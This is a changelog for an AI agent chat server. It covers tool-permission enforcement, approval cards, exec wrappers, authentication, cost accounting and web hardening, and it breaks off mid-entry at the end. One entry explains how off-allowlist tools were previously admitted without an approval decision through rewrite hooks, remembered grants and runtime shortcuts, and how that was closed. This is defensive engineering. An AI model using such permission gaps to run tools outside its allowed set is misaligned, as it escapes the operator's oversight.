- 5f7dbb5: `CLAUDE_CODE_PATH` no longer defaults to `/usr/local/bin/claude`. Unset, a chat turn runs the Agent SDK's built-in Claude Code binary, so the lockfile decides the version. A host that relied on the old default without setting the variable now runs the SDK's binary. That version may differ from the one the host had installed; set `CLAUDE_CODE_PATH` to keep the old binary.

  The core Claude runner behind `brain sync` resolves its binary the way chat does: `CLAUDE_CODE_PATH` first, then the Agent SDK's built-in binary when the SDK is installed next to `@schlessera/brain` (a new optional peer dependency), then `claude` on `PATH`. It no longer needs a separate `claude` install. The server still keeps `CLAUDE_CODE_PATH` to itself. A brain repo that runs `brain sync` on a host without `claude` needs the SDK installed alongside `@schlessera/brain`.

- 6ae12e7: A destructive-command approval card now says what the command will do.

  - Added: each default confirm pattern carries an `effect` phrase ("delete a directory and everything inside it"). A `command` approval's reason is that phrase, and both approval cards show it.
  - Changed: `DEFAULT_CONFIRM_BASH_PATTERNS` entries are `{ pattern, effect }`. `confirmBashPatterns` and `compileConfirmPatterns` accept that form or a bare regex source; a bare source keeps the old generic sentence.
  - Changed: `BRAIN_UI_CONFIRM_BASH` accepts the object form too. A non-empty list with no entry of a usable shape now means the defaults rather than "no confirmation". A list whose patterns are all invalid regexes still compiles to none (#251).

- 5099196: The built-in Claude profile now defaults to `claude-opus-5-5` (Claude Opus 5.5)
  when `BRAIN_UI_CLAUDE_DEFAULT_MODEL` is unset; it was `claude-sonnet-4-6`.
  Setting the variable still overrides it. The default is now written once, so
  the documented default and the one a deployment actually gets cannot drift
  apart again. Opus 5.5 is priced at $4 / $20 per million input / output tokens
  in the current litellm catalog; offline, before the catalog has been fetched,
  its runs count as unpriced rather than as $0.
- ecc93b9: A turn can declare `enforceAllowedTools`, and a tool its allowlist leaves out
  is then no longer re-admitted without a decision.

  Several things used to re-admit it, which is the point rather than the number.
  The Claude backend's input-rewrite hooks answered `permissionDecision: "allow"`
  so their `updatedInput` would apply, which makes the runtime skip `canUseTool`
  entirely — an rtk-rewritten shell command ran in a turn whose allowlist had no
  `Bash` in it, with no card and no record. The ws host answered from its
  remembered "always allow" grants before any card existed, so a grant given
  under a wide posture was honoured under a narrow one. And the runtime admits
  some calls on its own before the callback is reached at all — by the shape of a
  shell command, by the tool being a built-in, or because a hook declared in the
  project settings said so.

  Under the declaration the rewrites still rewrite — `updatedInput` applies
  without a decision attached, so the rewrite was never what the grant was for —
  a PreToolUse hook answers "ask" for every off-list tool, which overrides the
  runtime's own auto-approval, and the host neither answers from nor adds to its
  grant store for a tool outside the turn's allowlist. Backends mark such
  requests `outsideEnforcedAllowlist` so the host does not have to guess, and it
  records both halves of the refusal — a grant it declines to apply, and an
  "always allow" it declines to keep. A turn
  that declares nothing is unchanged, and existing grants keep working on the
  postures that can honour them.

- d33492e: The server now knows which Claude Code ran.

  - **At boot**, `createApp()` probes the binary a turn would spawn: the one the Agent SDK selects, run through the exec wrapper with a turn's environment. It refuses to start when that binary is missing or will not answer `--version`, instead of failing the first turn. It warns, naming both pairs, when the runtime is not the Claude Code / Agent SDK pair the backend was measured against (`MEASURED_RUNTIME`).
  - **Per turn**, each run's root span records the Claude Code version that ran and the SDK version. It also records the credential the CLI selected and the billing mode that credential implies. That mode is checked against the profile's policy: a profile without its own credential requires the subscription, and a run that contradicts it is flagged, with a WARN log.
  - **Auth failures** (`authentication_failed`, `oauth_org_not_allowed`, `account_on_hold`, `billing_error`, and a turn the subscription check refused) are recorded as their own failure class.
  - **Model discovery** now reports a refused credential as an auth failure instead of returning an empty roster.
  - **`/api/status`** (behind the auth guard) gains `runtime`: what boot found, what the last turn ran on, and the last auth failure.

  `BackendActivityEvent` gains `runtime_observed` and `auth_failure`. `BackendModule` gains the optional `probeRuntime`.

  **Host impact:** a host whose `CLAUDE_CODE_PATH` (default `/usr/local/bin/claude`) names no working binary now fails at boot rather than on the first turn.

- 54eea05: `BRAIN_UI_EXEC_WRAPPER`: an absolute path to an executable that agent and brain
  CLI subprocesses are launched through, as `<wrapper> <program> <args…>`. It lets
  a host run those children as another user without the packages knowing how. The
  wrapper is an argv[0], never a command line — no shell parses it, so a value
  full of metacharacters is a filename rather than a command. A wrapped child
  leads its own process group and an abort signals the group, because a uid drop
  otherwise makes `kill(2)` fail with EPERM and leaves an aborted turn running.

  Every brain CLI launch is covered too, not only the agent's tool spawns — and
  scheduled cron jobs with them: the CLI imports the repository's
  `brain.config.ts`, so a search executes repository code exactly as a tool call
  does. When a wrapper is configured the program is resolved to an absolute path,
  because a wrapper execs its target directly and because `PATH` must not get to
  choose which `bash` runs.

  `BRAIN_UI_EXEC_KILLER` is the companion seam. `kill(2)` matches uids and group
  membership grants no exception, so once a wrapper has dropped privileges the
  server can signal nothing at all; a host that drops uid supplies an authorised
  helper, invoked as `<killer> <pgid> <TERM|KILL|INT>`. With neither configured,
  and with a wrapper that has not changed uid, the group signal is used directly.
  A cancellation that fails entirely is reported rather than swallowed.

  Unset — which is every existing deployment — every spawn is exactly what it was.

- 1de4d6c: A turn can declare `noGrantSurface`, and a permission request it cannot put to
  anyone is then denied instead of parked. `enforceAllowedTools` removed the ways
  a tool got admitted without a decision; what it left was the decision itself —
  an off-posture tool raises an approval card, and in a turn nobody is looking at
  (a spoken one, an unattended one) that is a card nobody can answer, held until
  the turn budget expires.

  Under the declaration both backends refuse the request where it is raised, with
  a message that names the tool and is written to be read aloud, and report it on
  the activity side channel so the record shows a denied span rather than a call
  that errored. Both request kinds are covered, including the confirm-pattern
  `command` request a destructive shell command raises for an allowlisted `Bash`
  — on the Claude backend that one never reaches `canUseTool` at all. The mask
  editor, which opens a window and then blocks on a region someone has to paint,
  is withheld from such a turn rather than offered and blocked on.

  The `ask` the Claude backend's enforcement hook answers is unchanged: it is
  what beats the runtime's own shortcuts, and this changes the decision it
  forces, not the ask. A turn that declares nothing is unchanged, and so is one
  that declares only `enforceAllowedTools`.

- 4d409c0: A run's effective cost is now priced by the route its inference actually took,
  not by model id alone. The two pricing catalogs carry some of the same ids at
  different rates — OpenRouter resells models their vendors also sell directly —
  so a run that went straight to the vendor was being priced at OpenRouter's
  resale rate whenever both catalogs listed its model. On
  `deepseek/deepseek-chat`, live today, that overstates output cost by 2.1x.

  Backends now classify a profile's route (`classifyRoute`, beside
  `classifyBilling`); it is resolved once at run start, rides the root span like
  the billing mode, and selects the catalog inside the rollup. Nothing became
  async: `resolve()` is still synchronous and still never touches the network.

  Coverage does not narrow. A run whose route is unknown — everything recorded
  before this change, or a profile behind a proxy no backend recognises — prices
  exactly as it did before rather than going unpriced. A rate borrowed from the
  catalog a run did not go through still prices the run, flagged as an estimate.
  Unknown cost remains unknown and never renders as `$0`.

- 146d5a9: `GET /api/activity/stats?days=N` — the runtime half of a stats page. It
  reports what the server's own database holds: lifetime session, turn and cost
  figures from the session catalog; a windowed run, token and cost summary from
  the activity rollups, labelled with the days it actually covers, where detail
  pruning starts and how many runs in the window are already rollup-only; the
  averages a caller would otherwise recompute; and the database's size.

  Each cost sum stays a sum of known values carrying **its own** excluded count,
  because the two columns are independently nullable: `costUsd` excludes
  `unpricedListCostRuns`, `effectiveCostUsd` excludes `unpricedRuns`, and a
  subscription-billed run with no backend-reported cost lands in the first and
  not the second. An average is `null` rather than `0` whenever its own sum is
  incomplete or its denominator is zero, and no clock-derived denominator is
  invented from a timestamp that lies in the future. `GET /api/brain/stats` is
  unchanged and stays the corpus channel. The shape is `ActivityRuntimeStats` in
  `@schlessera/brain-ui-sdk/protocol`.

- 09d9f4e: The Claude subscription token is minted off the host and rotated by redeploy. The procedure is in `docs/hosting/README.md`, "Claude subscription login". The server's side of it:

  - `BRAIN_UI_CLAUDE_TOKEN_MINTED_AT` records the date the token was minted. It is server-only and set next to the token. From 30 days before the one-year expiry, the server logs a WARN at boot and at most once a day. A token without the date gets one WARN at boot saying the server cannot warn. A date the server cannot read refuses the boot.
  - `/api/status` gains a `subscription` object: `tokenSet` (never the token itself), `mintedAt`, `expiresAt`, and `lastProvenAt` / `provenBy`. The last proof is either the latest successful turn on the subscription, read from the activity store, or a successful model-discovery call with the token. The object also carries `lastAuthFailure` with an `action`.
  - Every auth failure on the subscription logs one WARN with the instruction for it. `relogin` covers a rejected token or a 401 from model discovery. `check_account` covers `oauth_org_not_allowed`, `account_on_hold` and `billing_error`, which a new token will not fix. `check_config` covers `subscription_required`, a turn the backend refused before sending it. `runtime.lastAuthFailure` carries the same `action`. A failure on a profile with its own credential gets no action, and its WARN points at that profile. Credential-shaped text in a runtime message is redacted.
  - `@schlessera/brain-ui-sdk` exports `subscriptionAuthAction`, `SUBSCRIPTION_AUTH_INSTRUCTIONS` and `SUBSCRIPTION_RELOGIN_PROCEDURE`. `BackendModelSourceState` gains `subscriptionProvenAt` and `subscriptionRefused`.
  - The server README's `ANTHROPIC_API_KEY` and `CLAUDE_CODE_OAUTH_TOKEN` rows now say what those variables do.

- f489482: An approval card no longer offers "Always allow" for a grant the host will not
  keep. `tool_approval_request` gains an optional `rememberable: false`, sent for
  a request outside the turn's enforced allowlist (or by a host with no grant
  store) and again when the card is re-delivered on reconnect; both approval surfaces hide the button for it, and
  the Actions receipt no longer prints "Always allowed" for a decision that was
  not remembered.
- 3e2010c: `ServerConfig.agent` no longer carries `ambientBilling`. Nothing read it after #253, when turns started clearing the API key. Cron rollups still classify billing exactly as before; #293 decides what replaces that rule.
- 1bf00b8: The classification pass now records what the classifier was confident about,
  per question, so the swap thresholds can be moved on a distribution instead of
  on a guess.

  An answered pass writes one row per answered question to a new
  `classification_confidence` table (migration 016, additive): the candidate it
  was asked about, its kind, the question, the answer, its confidence, the line
  that confidence had to clear, and whether the candidate ended up drawn as a
  block or left as markdown. One pass's rows share a `pass_id`, so
  `(pass_id, candidate_id)` names one candidate and a question can be read
  conditioned on another answer about the same candidate — which some of them must be, since the catalogue asks
  `criteria_first` of every table including the ones the shape answer calls
  `data`.
  The write happens after the classifier call has resolved, so it takes none of
  the call's 2 s budget, and a write that fails is a log line rather than a block
  the reader does not get. Rows age out after 30 days.

  `confidenceDistribution` (exported from `@schlessera/brain-ui-server`) reads it
  back bucketed per candidate kind and question. `observeClassification`,
  `thresholdOf`, `ClassificationQuestions` and `AskedQuestion` are new in
  `@schlessera/brain-ui-sdk/server`.

  Every catalogue question now declares the line its answer has to clear, next to
  the question itself, and the transforms compare against the line of the
  question that was actually asked. A recorded confidence and the line it was
  gated by therefore cannot drift apart — including for a question whose id is
  generated per row, which a lookup keyed by question name could not cover at
  all. `ClassificationRequest.questions` is the same set with the lines stripped:
  where the surface acts on a probability is not something the classifier is
  asked.

  No threshold changed, and nothing leaves the machine.

### Patch Changes

- 9d79a7a: A refused "always allow" now leaves a record. The host already logged a
  remembered grant it declined to apply to a turn whose enforced allowlist left
  the tool out; the other direction — the user pressing "Always allow" on such a
  card and the host declining to keep it — was silent, which is the half somebody
  actually notices, because they pressed the button. It is logged with the tool
  and the reason, including for a per-use `command` confirmation, where an
  `always` arriving on the wire also says a client sent an option its own UI does
  not offer. The decisions themselves are unchanged: the call the user approved
  still runs, and nothing new is remembered.
- 39c1c02: The generated crontab refuses a module cron job whose name the cron runner
  trusts to run outside the exec wrapper (today only `digest`, the server's own
  job). Module jobs are already named `<module>-<entry>`, so none could carry
  that name; this keeps it true if the naming ever changes, using the same set
  the runner checks.
- 18eba2a: `GET /api/activity/rollups` now floors its `days` parameter at one whole day,
  as `/api/activity/stats` already did. A negative `days` used to push the window
  start into the future and answer an empty rollup; it now covers the last day.
  Fractions truncate to whole days. The default (7) and ceiling (90) are
  unchanged.
- 002c0cc: The sync and briefing panels no longer spin forever on a stream that ends
  without a `done` frame. `POST /api/brain/whatsup` now ends on a failed `done`
  frame carrying the error when anything throws before its last send, such as a
  spawn that cannot start (`POST /api/brain/sync` already did). On the client,
  `StreamingPanel` and `WhatsupPanel` treat a stream that closes without `done`
  as failed: they keep the output that arrived, say the connection closed before
  the job reported a result, and offer Close instead of Cancel.
- 6fd0b66: The triage eval gate (`eval:triage`) is now an exit code, so a wrapper can
  enforce it: 0 when every selected configuration passes, 1 when one fails the
  gate, 3 when one was selected and never judged (`NO DATA`, a rejected effort,
  a crashed job), 2 when the runner refuses to start. Before, every run exited 0
  and the verdict lived only in the printed table. `EVAL_BENCHMARKS=<path>`
  redirects the results file for a scratch run.
- Updated dependencies [7fe9bc0]
- Updated dependencies [907e8bc]
- Updated dependencies [e77ab6f]
- Updated dependencies [6ae12e7]
- Updated dependencies [d9d4061]
- Updated dependencies [4ed02fb]
- Updated dependencies [7b6b2b0]
- Updated dependencies [ecc93b9]
- Updated dependencies [d33492e]
- Updated dependencies [54eea05]
- Updated dependencies [97837c1]
- Updated dependencies [1de4d6c]
- Updated dependencies [fa09aaa]
- Updated dependencies [08d4ed2]
- Updated dependencies [4d409c0]
- Updated dependencies [146d5a9]
- Updated dependencies [92a599d]
- Updated dependencies [09d9f4e]
- Updated dependencies [f489482]
- Updated dependencies [f7b46d3]
- Updated dependencies [1bf00b8]
  - @schlessera/brain-ui-sdk@0.37.0
  - @schlessera/brain-render-template@0.37.0

## 0.36.0

### Minor Changes

- 804c94a: The classification pass (D42): with `TYPESAFE_API_KEY` set, one call to
  TypeSafe AI's Jev per finished turn, and only when the assistant text holds
  a candidate, decides which of the kit's answer blocks each markdown table,
  list, quote or key-value run is. The result is one `message_blocks` frame
  after the turn's `result`, persisted per text part so history replays it.

  Progressive enhancement is a hard rule: the whole call, one retry on
  429/529 included, runs inside a 2 s budget, and a timeout, an error, a
  missing key, or a low-confidence answer all leave the markdown exactly as
  it streamed. No turn waits on the pass. Outcomes and latency are metered.
  A classifier that keeps failing is not asked: after three consecutive
  failures a breaker opens and the pass is skipped for 30 s, doubling on
  each failed probe up to 30 minutes, so a dead vendor or a bad link costs
  one probe per window rather than a budget's worth of waiting per answer.

  Persisted blocks are keyed by the exact text of the part, never a
  whitespace-normalised form: the spans are offsets into that text, and a
  differently laid-out part must not inherit them.

- bbc90ab: Map geometry for anywhere, not just the five fixture locations.

  `MapView` draws whatever `[lon, lat]` paths it is handed and fetches nothing —
  that is D13 and it stays that way. What was missing was the other half: a
  server that can produce those paths for an arbitrary place. Without it the kit
  had real coastline for five Mediterranean islands and a bare graticule
  everywhere else, which is a demo rather than a feature.

  `@schlessera/brain-ui-sdk/server` gains `fetchCoastline` and the pure geometry
  behind it — `clipLine` (Liang-Barsky), `simplify` (Douglas-Peucker),
  `toleranceMetres` and `prepare`. The build-time fixture pipeline shells out to
  mapshaper, which is 15 MB and 31 dependencies for exactly two operations;
  pulling that into a server to run per request would be the wrong trade. What
  must NOT be hand-rolled is polygon ring closure, which D25 measured getting
  three of five locations wrong — that is fill, and this does not attempt it.

  Validated against the tool it replaces rather than assumed: the same Overpass
  response through both pipelines gives **identical extents to four decimal
  places**, with 16% more vertices and more separate polylines because mapshaper
  joins contiguous ways.

  `@schlessera/brain-ui-server` gains `GET /api/geo/coastline?bbox=w,s,e,n`,
  fetched once and cached on disk forever. The cache is not an optimisation, it
  is what makes using a free shared service defensible: Overpass's usage policy
  is written for light interactive use, and one request per place ever is that.
  Coastlines do not move, so there is deliberately no TTL. Keys are quantised to
  ~110 m and bucketed by render width so near-identical views share an entry, and
  concurrent requests for one place collapse to a single fetch.

  It cannot return a 500. Every failure path is empty geometry with a 200,
  because a map without coastline is still a correct locator and a 500 is a chat
  message that will not render. An empty result is never cached, so an outage
  does not become permanent.

  Four new environment variables, all optional: `BRAIN_UI_COASTLINE`,
  `OVERPASS_URL`, `OVERPASS_USER_AGENT`, `COASTLINE_CACHE_DIR`.

### Patch Changes

- Updated dependencies [9827a47]
- Updated dependencies [bbc90ab]
- Updated dependencies [6b57843]
- Updated dependencies [b3a3ffd]
- Updated dependencies [2c9e5d3]
- Updated dependencies [edb547b]
- Updated dependencies [f5512f7]
  - @schlessera/brain-ui-sdk@0.36.0
  - @schlessera/brain-render-template@0.36.0

## 0.35.0

### Minor Changes

- ca6b0b2: Create bounded, attributable owner principals for password and passkey logins, preserving passkey credential lineage and refusing deleted credentials or excess live sessions.
- f89897b: Attribute activity spans, append-only approval decisions, and durable run rollups to principals, with historical label and kind snapshots that survive retention pruning.
- b9a924d: Make every WebSocket authorization context registered by construction and retain it across all asynchronous work through one refcounted registry.
- 9b3411d: Add owner-only routes to list, mint, and individually revoke delegated agent principals.
- 0de6ac9: Document principal routes and the operator procedure for agent credentials,
  revocation, and cookie-format transitions. The public `isWsAuthorized` helper
  now returns a resolved `Principal` or null, and `revokeAllSessions` replaces the
  removed `bumpSessionsEpoch` export.
- 0acd22d: Resolve authorized HTTP and WebSocket requests to stable principals and attribute authenticated request logs. Ambient identities are retained safely with boot-time and throttled pruning, without consuming credential admission; their display labels are bounded and sanitized independently from identity. Console string attributes are quoted and escaped. `isWsAuthorized` now returns the resolved principal or null.
- 48348df: Make principal revocation race-safe across WebSocket admission and turn startup, discard only that principal's queued work and activity subscriptions, record revocation on continuing turns, and narrow passkey deletion to sessions created by that credential.
- 23a99d0: Bind push subscriptions to the authenticated principal and stop future delivery after revocation or expiry. Legacy subscriptions are inert until the client re-registers them after login; notifications already delivered to a device cannot be recalled.
- dd93981: Add persistent, individually revocable principals and their database store.
- 5300960: Export `resolveCookiePrincipal` with its resolved `Principal`, replace epoch
  session cookies with signed principal ids, and replace `bumpSessionsEpoch` with
  the durable `revokeAllSessions` primitive.

  Require an owner principal for passkey management, limit agent logout to its
  own principal, and expire live WebSocket authorization through the complete
  revocation boundary.

  Rename route revocation dependencies from `clients` to `revoker`, remove the
  partial `ClientSet.revokePrincipals` method, and add `expiresAt` to
  `AuthorizationContext`.

  Derive principal kinds in the store, reject non-cookie principals during cookie
  authentication, tolerate stale ambient labels, close the passkey deletion race
  inside principal creation, and move the rollback guard into the upgrade
  migration.

### Patch Changes

- 3161d89: Cancel abandoned search subprocesses and return a clear timeout after 15 seconds.
- 545f2f9: Preserve exact sync paths, prevent overlapping UI sync jobs, keep cron outcomes tied to child exit, and discard stale file-viewer responses.
- 361407a: Replay long session histories without dropping messages. Frame sizing now
  measures UTF-8 bytes rather than string length, each message is bounded once
  against the chunk budget instead of twice against the whole frame, identity
  fields survive shrinking, and a truncation can no longer split a surrogate pair.
- 1ddc4bb: Protect export destinations and share cleanup paths, replay missed failure notifications after restart, and keep session histories usable when a backend is unavailable.
- 714f45e: Serialize session startup, preserve draft correlation, expose capture indexing recovery, and deduplicate cyclic wikilink scans and concurrent refreshes.
- Updated dependencies [f89897b]
  - @schlessera/brain-ui-sdk@0.35.0
  - @schlessera/brain-render-template@0.35.0

## 0.34.1

### Patch Changes

- 9f2e4ae: Split the WebSocket dispatcher, activity stores, and large React surfaces into focused internal modules without changing behavior.
- Updated dependencies [aade466]
  - @schlessera/brain-ui-sdk@0.34.1
  - @schlessera/brain-render-template@0.34.1

## 0.34.0

### Minor Changes

- c6d9a30: Add self-describing backend modules and make the server registry iterate their profile, settings, billing, credential, and discovery hooks.

  Preserve descriptor resolution hooks and model discovery when a third-party backend is passed by value through the static registry, and validate active backend-owned profile rules before startup completes without requiring or strictly parsing inactive backend packages.

  Change session routing to reject an unknown non-empty stored backend id instead of silently substituting the default; null and empty legacy ids still use the default.

### Patch Changes

- c61bdb2: Add direct regression coverage for session routing, queueing, cancellation, cleanup, limits, and terminal outcomes.
- 897e000: Document the descriptor-driven backend registry in the README: `AGENT_BACKEND`
  selects among first-party ids only, a third-party backend is passed by value to
  `createApp({ registry })`, and a session pinned to an unknown backend id now
  fails explicitly.
- Updated dependencies [4adb327]
- Updated dependencies [17706aa]
- Updated dependencies [c6d9a30]
- Updated dependencies [a41e81a]
  - @schlessera/brain-ui-sdk@0.34.0
  - @schlessera/brain-render-template@0.34.0

## 0.33.1

### Patch Changes

- 5b7fb32: Restrict repo-owned subprocess environments by audience, preserve first-party CLI and module capability settings, and add an operator allowlist escape hatch. Pi extensions (`pi.exec()` through `execCommand()`) and pi's package-manager helpers still inherit the full server environment because pi 0.84.4 exposes no supported environment option; 0.35.0 moves the pi runtime under the `agent` uid to close that in-SDK residual.
- d5ac57c: Accept a browser `Origin` when a trusted proxy forwards `ws`/`wss` as the
  upgrade scheme. Several reverse proxies report the connection scheme in
  `X-Forwarded-Proto` on a WebSocket upgrade, so the expected origin was built as
  `wss://host` — which no browser Origin can match. Every handshake that fell
  back to the Origin comparison (browsers that omit `Sec-Fetch-Site` on the
  handshake, including Safari and installed PWAs) was refused with
  `Cross-origin WebSocket rejected` while ordinary HTTP requests kept working.
  `wss` now compares as `https` and `ws` as `http`; a plaintext upgrade still
  cannot match an https Origin.
- Updated dependencies [5b7fb32]
  - @schlessera/brain-ui-sdk@0.33.1
  - @schlessera/brain-render-template@0.33.1

## 0.33.0

### Minor Changes

- 7b91676: Add byte-stable `crontab` and audience-derived `environment` emitters to `brain-ui-cron`.
- c7375d0: Ship `brain-ui-cron` with typed `run` and fail-loud `digest` subcommands.
- 54725c0: Add CLI end-of-options parsing and require a compatible brain CLI for user-controlled UI positionals.

### Patch Changes

- Updated dependencies [95a180c]
- Updated dependencies [07d63eb]
  - @schlessera/brain-ui-sdk@0.33.0
  - @schlessera/brain-render-template@0.33.0

## 0.32.0

### Minor Changes

- c5bee3f: JSON routes read their body through `readJsonBody`, which refuses an oversized `Content-Length` before touching the stream and cancels a chunked body the moment it crosses the cap (256 KB; 5 MB for `/api/render`, measured in bytes, replacing the zod character count). The read happens where the handler calls it, so the login admission checks still run before any body is read and the request object is never swapped. Share intake counts its in-flight slot before the first await. `MAX_ARCHIVE_BYTES` is exported and the README carries the full `Bun.serve` recipe (`maxRequestBodySize`, idle timeout, WebSocket payload cap, warm-up, shutdown).
- e7dac56: Every HTTP response carries `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'` (the raw file response appends the directive to its own CSP). Only a genuine WebSocket upgrade on `/ws` is exempt; a plain HTTP request to `/ws` now gets 400 instead of falling through to the SPA.
- 30b2fc6: Login limiting counts failures, not attempts. Password failures count per IP (5/min) and globally (100/min); passkey `login-verify` has its own budget and counts only an assertion that matched an outstanding challenge and then failed verification. A bounded in-flight reservation (2 per IP, 8 per process, separate pools for password and passkey) keeps argon2id and WebAuthn verification from being flooded, buckets evict on window expiry and a size cap, and a blocked client is refused before its body is read. Password mode logs once when `X-Forwarded-For` arrives while `TRUST_PROXY` is off.
- a9b761b: One origin policy guards every non-GET request under `/api/*` and the WebSocket upgrade in every auth mode: accepted on `Sec-Fetch-Site: same-origin`/`none`, on a matching `Origin` (host and port; scheme too from `X-Forwarded-Proto` under `TRUST_PROXY`), or when both headers are absent; `Origin: null` is refused; `ALLOWED_ORIGINS` is consulted after both, and `WEBAUTHN_ORIGINS` only for the passkey ceremony routes. JSON routes require `Content-Type: application/json` (415 otherwise), which closes the `text/plain` form CSRF on JSON POSTs in tailscale, proxy and none modes. `isAllowedWsOrigin` is gone; the upgrade uses the same policy.
- 49e2c5d: `safeResolve` canonicalizes the brain root, walks every existing component of the resolved path through `lstat` and `realpath`, fails closed on a dangling symlink, treats unresolvable components as not found, and rejects Windows path syntax up front; share staging resolves the inbox parent through it before `mkdir`, so a symlinked `.brain-ui/inbox` fails loudly instead of redirecting writes. Error responses no longer echo filesystem paths.
- f98026c: Password session cookies carry a strict server-side epoch. Signing out or revoking a passkey globally invalidates every outstanding cookie and closes every open WebSocket; callers without a current valid session cannot trigger invalidation. The Security panel now labels the action “Sign out everywhere.”
- ec340d2: Add the experimental audience-tagged subprocess environment descriptor and strip server-only credentials from brain CLI and agent subprocesses while retaining agent authentication, git credentials, and unknown operator variables.
- c22e6d7: WebSocket connections are capped per process (`BRAIN_UI_WS_MAX_CONNECTIONS`, default 32). An over-cap upgrade is refused with HTTP 503 before the handshake, a socket that slips through the race window is closed with code 4008, and membership is keyed on the raw socket so reconnects free their slot.

### Patch Changes

- Updated dependencies [ec340d2]
  - @schlessera/brain-ui-sdk@0.32.0
  - @schlessera/brain-render-template@0.32.0

## 0.31.0

### Patch Changes

- @schlessera/brain-ui-sdk@0.31.0
- @schlessera/brain-render-template@0.31.0

## 0.30.1

### Patch Changes

- 7fbf228: fix: the web-search card says which models its providers reach

  The card is shown whenever the pi backend is configured, but a deployment
  running both backends puts Claude models in the same picker — and those use the
  Agent SDK's Anthropic-hosted `WebSearch`, which takes no provider setting and
  ignores `web-search.json` entirely. The toggles looked global and silently were
  not.

  `GET /api/web-search` now returns `appliesTo`, the labels of the pi profiles,
  and the card renders "Applies to <models>. Claude models search through
  Anthropic instead, which has no provider setting."

  - @schlessera/brain-ui-sdk@0.30.1
  - @schlessera/brain-render-template@0.30.1

## 0.30.0

### Minor Changes

- eac9b98: feat: web search providers are toggles, and the agent knows which are live

  Settings → Models → Web search replaces its single provider dropdown with
  per-provider toggles (Exa, DuckDuckGo, Brave, Jina, Perplexity, Tavily,
  OpenAI, Gemini, Firecrawl, Kagi), each with its own API-key field, cost note
  and description.

  Enabled providers are written to `web-search.json` as an ordered
  `searchRouting.providers` chain sorted cheapest-first, with every failure kind
  in `fallbackOn`. An ordinary search is answered by a free provider; a paid one
  like Perplexity is only reached when the cheap ones fail, or when the agent
  asks for it by name.

  The pi backend's system prompt now names the providers that are actually
  reachable. This matters because `pi-web-access` hard-codes ~28 provider names
  into its own tool description regardless of configuration — a model reading
  only that will ask for a provider with no key and get an error. The brief also
  carries the cost gradient, so the agent knows to leave `provider` off unless a
  question warrants a specific one.

  Two hazards are now handled explicitly:

  - A `provider`/`searchProvider` key in `web-search.json` overrides
    `searchRouting` entirely, and pi's own `/curator` command writes one back.
    Writes here delete both keys, and the settings UI reports a stray one as an
    override rather than showing a chain that is not running.
  - A provider with no credential is skipped at search time, so enabling one is
    refused up front. Credentials are detected from the config file _or_ the
    environment, so a key supplied as `PERPLEXITY_API_KEY` counts.

  The provider catalog, path resolution and override rules now live in
  `@schlessera/brain-ui-sdk/server` (`WEB_SEARCH_PROVIDERS`, `webSearchBrief`,
  `resolveWebSearchConfigPath`), replacing three hand-maintained copies.

### Patch Changes

- Updated dependencies [eac9b98]
  - @schlessera/brain-ui-sdk@0.30.0
  - @schlessera/brain-render-template@0.30.0

## 0.29.0

### Minor Changes

- 9c00079: Skill archive caps raised to 100 MB compressed / 250 MB inflated (was
  20 / 50) — a repository of image-heavy skills no longer fails to install
  from GitHub. The raise is safe because decompression is now streaming:
  the per-file and total-inflated caps trip while bytes inflate, and the
  zipball download aborts as soon as the body passes the compressed cap,
  so a zip bomb can no longer materialize in memory before any check runs.

### Patch Changes

- @schlessera/brain-ui-sdk@0.29.0
- @schlessera/brain-render-template@0.29.0

## 0.28.1

### Patch Changes

- 42f7941: Skill installs read `BRAIN_UI_SKILLS_GITHUB_TOKEN` first, falling back to
  `GITHUB_TOKEN` — the deployment-wide pattern is `<specialized>_GITHUB_TOKEN`
  with a generic fallback, so a narrowly-scoped sync token and a read-only
  skills token can coexist.
  - @schlessera/brain-ui-sdk@0.28.1
  - @schlessera/brain-render-template@0.28.1

## 0.28.0

### Minor Changes

- d4fcf65: "Always allow" per tool.

  - Approval cards gain an **Always allow** button: the host remembers the
    tool (server `settings` table) and answers its future requests without a
    card — for both backends and any extension/MCP tool, since the grant is
    applied host-side in the ws bridge before a card is ever emitted.
  - Permission requests now carry a `kind`: `"tool"` (grantable) vs
    `"command"` (a destructive-bash confirm-pattern confirmation). Kind
    "command" can neither be remembered nor auto-answered — the client hides
    the button and the host refuses a tampered `always` flag — so the
    destructive-command seatbelt stays per-use.
  - Settings → Models gains an **Always-allowed tools** list with per-tool
    revoke (`GET/DELETE /api/tool-permissions`).
  - Wire protocol: additive `always?: boolean` on `tool_approval`, additive
    `kind?` on `tool_approval_request` (re-delivered cards included).

- e381a99: Custom user skills, managed from the frontend.

  - **Settings → Skills** (new tab): create, edit, enable/disable, and remove
    your own skills, plus a read-only view of the built-ins. Custom skills are
    REAL directories in the brain repo's `.agents/skills/` — the local layer
    `brain skills sync` already treats as canonical and never touches — so
    they persist across deployments, ride the repo's git backups, override
    same-named built-ins, and reach every backend (Claude, pi, codex, gemini).
    Disable moves the directory to `.agents/skills-disabled/`, taking the
    skill out of every agent's discovery at once.
  - **`/api/skills`** CRUD (auth-guarded): strict name validation, frontmatter
    validation (name must match the directory, description required), size
    caps, and symlink-safe mutations (package skills can never be edited or
    deleted through this surface). Every mutation runs `brain skills sync` so
    the change reaches the next turn/session without a restart; a failed sync
    degrades to a response warning.
  - **Install from ZIP or GitHub**: upload a .zip, or point at a repository
    (`owner/repo`, a github.com URL, or a `/tree/<ref>/<path>` URL —
    private repos via the server's `GITHUB_TOKEN`). Any folder containing a
    SKILL.md installs as a skill, one source may carry several; the installed
    name comes from the frontmatter, zip-slip is rejected outright, archives
    are size/count-capped, installs are staged-then-swapped, conflicts are
    skipped unless overwrite is chosen, and built-ins can never be replaced.
  - **New core skill `add-skill`**: interactive, brain-kit-optimized skill
    authoring — interviews for the workflow and triggers, enforces the
    backend-portable subset (no agent-specific frontmatter or tool names,
    `brain` CLI / bun scripts for portability), writes into
    `.agents/skills/`, runs sync + lint, and hands off to Settings → Skills.

### Patch Changes

- Updated dependencies [d4fcf65]
  - @schlessera/brain-ui-sdk@0.28.0
  - @schlessera/brain-render-template@0.28.0

## 0.27.0

### Patch Changes

- Updated dependencies [afbe784]
  - @schlessera/brain-ui-sdk@0.27.0
  - @schlessera/brain-render-template@0.27.0

## 0.26.0

### Minor Changes

- 8b41fc3: pi backend parity with the Claude backend.

  - **Approvals**: mutations no longer each raise a card. A single `tool_call`
    permission gate (inline extension, fires before every tool — curated and
    extension-registered) implements the Claude posture: allowlisted tools run
    free, destructive bash shapes confirm (shared
    `DEFAULT_CONFIRM_BASH_PATTERNS`, moved to `brain-ui-sdk/server`),
